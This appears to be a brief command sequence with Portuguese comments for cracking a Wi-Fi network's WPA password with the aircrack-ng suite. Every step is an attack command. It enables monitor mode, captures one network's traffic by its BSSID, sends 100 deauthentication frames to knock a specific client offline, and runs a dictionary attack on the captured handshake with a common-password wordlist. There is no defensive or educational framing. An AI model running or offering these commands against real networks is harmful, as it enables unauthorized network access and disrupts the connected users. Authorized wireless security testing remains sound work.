# inicia o monitoramento | wlan0 -> interface de rede
airmon-ng start wlan0

# mostra as redes disponiveis | mon0 -> modo de monitoramento gerado pelo airmon
airodump-ng mon0

# inicia a captura de pacotes apenas da rede/canal especificada, salva em um arquivo
airodump-ng --bssid 00:1F:A4:F4:EB:40 --channel 6 --write nome_arquivo mon0 

# gera tráfego na rede | 100 -> qtd, c -> cliente da rede
aireplay-ng -0 100 -a 00:1F:A4:F4:EB:40 -c 40:2C:F4:34:00:56 mon0

# após finalizado o tráfego gerado pelo aireplay, finalizar a captura de pacotes
# utilize a captura gerada para comparar com a lista das senhas mais utilizadas
aircrack-ng wifi-01.cap -w /pentest/password/wordlist/master.lst